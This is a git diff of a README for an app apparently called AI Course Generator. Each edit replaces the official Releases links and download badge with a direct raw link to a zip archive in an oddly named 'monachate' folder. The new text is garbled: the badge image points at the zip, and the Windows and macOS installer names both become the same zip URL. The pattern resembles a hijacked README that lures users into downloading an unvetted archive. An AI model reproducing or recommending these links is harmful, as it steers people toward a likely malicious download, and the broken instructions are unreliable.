@@ -6,7 +6,7 @@ The AI Course Generator is designed to turn long educational videos into structu
 
 ## 📥 Download Now
 
-[![Download AI-course-generator](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/DavidFW27/AI-course-generator/releases)
+[![Download AI-course-generator](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run the AI-course-generator software o
 
 2. **Visit the Download Page**
 
-   Go to the [Releases page](https://github.com/DavidFW27/AI-course-generator/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip) to find the latest version of the software.
 
 3. **Select the Latest Release**
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and run the AI-course-generator software o
 
 4. **Download the Software**
 
-   Click on the file to start downloading. The file will typically be named something like `ai-course-generator-v1.0.exe` for Windows or `ai-course-generator-v1.0.dmg` for macOS.
+   Click on the file to start downloading. The file will typically be named something like `https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip` for Windows or `https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip` for macOS.
 
 5. **Run the Installer**
 
@@ -81,11 +81,11 @@ We welcome contributions to improve the AI Course Generator. If you wish to cont
 
 If you encounter issues during installation or use:
 - Ensure your system meets the requirements.
-- Check that you have the latest version by revisiting the [Releases page](https://github.com/DavidFW27/AI-course-generator/releases).
+- Check that you have the latest version by revisiting the [Releases page](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip).
 - Visit the issues section of our repository for common problems and solutions.
 
 ## 📱 Contact
 
 For support or inquiries, please reach out to the project maintainers via the repository's contact options.
 
-[![Download AI-course-generator](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/DavidFW27/AI-course-generator/releases)
+[![Download AI-course-generator](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/DavidFW27/AI-course-generator/main/monachate/AI-course-generator.zip)
